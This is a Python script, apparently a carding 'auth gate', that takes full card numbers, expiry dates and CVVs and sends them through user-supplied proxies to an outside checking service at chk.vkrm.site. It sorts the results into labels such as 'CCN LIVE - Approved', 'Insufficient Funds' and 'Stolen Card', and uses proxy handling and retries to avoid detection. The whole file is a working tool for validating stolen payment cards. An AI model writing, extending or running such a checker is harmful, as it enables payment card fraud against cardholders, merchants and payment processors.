"""
Braintree CVV Auth Gate via VKRM API
External API: https://chk.vkrm.site
"""

import requests
import os
import time
import re
from typing import Tuple, Optional


def normalize_proxy(proxy) -> Optional[str]:
    """
    Normalize proxy to proper URL format for the API.
    
    Handles:
    - IP:PORT:USER:PASS -> http://USER:PASS@IP:PORT
    - IP:PORT -> http://IP:PORT
    - Already formatted URLs (http://USER:PASS@IP:PORT)
    - Dict with 'http' or 'https' keys
    """
    proxy_str = None
    
    if proxy:
        if isinstance(proxy, dict):
            http_proxy = proxy.get('http') or proxy.get('https', '')
            if http_proxy:
                proxy_str = http_proxy
        elif isinstance(proxy, str):
            proxy_str = proxy.strip()
    
    if not proxy_str:
        env_proxy = os.environ.get('PROXY', '')
        if env_proxy:
            proxy_str = env_proxy.strip()
    
    if not proxy_str:
        return None
    
    if proxy_str.startswith('http://') or proxy_str.startswith('https://'):
        return proxy_str
    
    parts = proxy_str.split(':')
    
    if len(parts) == 4:
        ip, port, user, password = parts
        return f"http://{user}:{password}@{ip}:{port}"
    elif len(parts) == 2:
        ip, port = parts
        return f"http://{ip}:{port}"
    elif '@' in proxy_str:
        return f"http://{proxy_str}"
    else:
        return f"http://{proxy_str}"


def classify_response(result: dict) -> Tuple[str, bool]:
    """
    Classify API response to standard status format.
    
    Returns:
        Tuple of (status_message, proxy_alive)
    """
    status = result.get('status', '').upper()
    message = result.get('message', '')
    message_lower = message.lower()
    message_upper = message.upper()
    
    if status in ('APPROVED', 'SUCCESS', 'LIVE'):
        return ("CCN LIVE - Approved", True)
    
    if 'CVV' in message_upper or 'CVC' in message_upper:
        if 'MISMATCH' in message_upper or 'INCORRECT' in message_upper or 'INVALID' in message_upper:
            return ("CCN LIVE - CVV Mismatch", True)
        elif 'MATCH' in message_upper or 'PASS' in message_upper:
            return ("CCN LIVE - Approved", True)
        else:
            return ("CCN LIVE - CVV Mismatch", True)
    
    if 'insufficient' in message_lower or 'nsf' in message_lower:
        return ("CCN LIVE - Insufficient Funds", True)
    
    if status in ('DECLINED', 'DEAD', 'FAILED'):
        if 'do not honor' in message_lower:
            return ("DECLINED - Do Not Honor", True)
        elif 'expired' in message_lower:
            return ("DECLINED - Expired Card", True)
        elif 'invalid' in message_lower and 'number' in message_lower:
            return ("DECLINED - Invalid Card Number", True)
        elif 'lost' in message_lower:
            return ("DECLINED - Lost Card", True)
        elif 'stolen' in message_lower:
            return ("DECLINED - Stolen Card", True)
        elif 'fraud' in message_lower:
            return ("DECLINED - Fraud", True)
        elif 'restricted' in message_lower:
            return ("DECLINED - Restricted Card", True)
        elif 'pickup' in message_lower:
            return ("DECLINED - Pick Up Card", True)
        else:
            return ("DECLINED - Card Declined", True)
    
    if 'do not honor' in message_lower:
        return ("DECLINED - Do Not Honor", True)
    if 'expired' in message_lower:
        return ("DECLINED - Expired Card", True)
    if 'invalid' in message_lower and ('card' in message_lower or 'number' in message_lower):
        return ("DECLINED - Invalid Card Number", True)
    if 'lost' in message_lower:
        return ("DECLINED - Lost Card", True)
    if 'stolen' in message_lower:
        return ("DECLINED - Stolen Card", True)
    
    if message:
        return (f"{status or 'UNKNOWN'} - {message[:40]}", True)
    
    return (f"Response: {status or 'Unknown'}", True)


def braintree_vkrm_check(card_num: str, card_mon: str, card_yer: str, card_cvc: str,
                         proxy: dict = None, max_retries: int = 3) -> Tuple[str, bool]:
    """
    Braintree CVV Auth check via VKRM external API
    
    Args:
        card_num: Card number
        card_mon: Expiry month (MM)
        card_yer: Expiry year (YY or YYYY)
        card_cvc: CVV/CVC code
        proxy: Proxy configuration (dict, string, or None)
        max_retries: Maximum retry attempts for 5xx errors
    
    Returns:
        Tuple of (status_message, proxy_alive)
        - proxy_alive=True for logical declines/approvals (API responded)
        - proxy_alive=False for network/proxy errors
    """
    if len(card_yer) == 4:
        card_yer = card_yer[2:]
    
    card_str = f"{card_num}|{card_mon}|{card_yer}|{card_cvc}"
    
    normalized_proxy = normalize_proxy(proxy)
    if not normalized_proxy:
        return ("Error: No proxy configured", False)
    
    proxy_for_api = normalized_proxy.replace('http://', '').replace('https://', '')
    
    api_url = f"https://chk.vkrm.site/?card={card_str}&proxy={proxy_for_api}"
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'application/json',
    }
    
    last_error = None
    
    for attempt in range(max_retries):
        try:
            response = requests.get(api_url, headers=headers, timeout=60)
            
            if response.status_code == 429:
                return ("Error: Rate limited - Try again later", True)
            
            if response.status_code >= 500:
                last_error = f"Server error ({response.status_code})"
                if attempt < max_retries - 1:
                    wait_time = (2 ** attempt) + (0.5 * attempt)
                    time.sleep(wait_time)
                    continue
                return (f"Error: {last_error} after {max_retries} retries", True)
            
            if response.status_code >= 400:
                return (f"Error: API error ({response.status_code})", True)
            
            try:
                result = response.json()
            except ValueError:
                return ("Error: Invalid JSON response", True)
            
            if 'error' in result:
                error_msg = result.get('error', 'Unknown error')
                error_lower = error_msg.lower()
                
                if 'proxy' in error_lower or 'connection' in error_lower:
                    return (f"Error: Proxy issue - {error_msg[:40]}", False)
                elif 'rate' in error_lower or 'limit' in error_lower:
                    return ("Error: Rate limited - Try again later", True)
                else:
                    return (f"Error: {error_msg[:50]}", True)
            
            return classify_response(result)
            
        except requests.exceptions.Timeout:
            return ("Error: Request timeout (60s)", False)
        except requests.exceptions.ProxyError:
            return ("Error: Proxy connection failed", False)
        except requests.exceptions.ConnectionError as e:
            error_str = str(e).lower()
            if 'proxy' in error_str or 'tunnel' in error_str:
                return ("Error: Proxy connection failed", False)
            return (f"Error: Connection failed - {str(e)[:30]}", False)
        except requests.exceptions.RequestException as e:
            return (f"Error: Network issue - {str(e)[:30]}", False)
        except Exception as e:
            return (f"Error: {str(e)[:40]}", False)
    
    return (f"Error: {last_error or 'Max retries exceeded'}", True)


if __name__ == "__main__":
    print("Testing proxy normalization:")
    print(f"  IP:PORT:USER:PASS -> {normalize_proxy('192.168.1.1:8080:user:pass')}")
    print(f"  IP:PORT -> {normalize_proxy('192.168.1.1:8080')}")
    print(f"  Already formatted -> {normalize_proxy('http://user:pass@192.168.1.1:8080')}")
    print()
    
    result, alive = braintree_vkrm_check("4242424242424242", "08", "28", "690")
    print(f"Result: {result}, Proxy OK: {alive}")
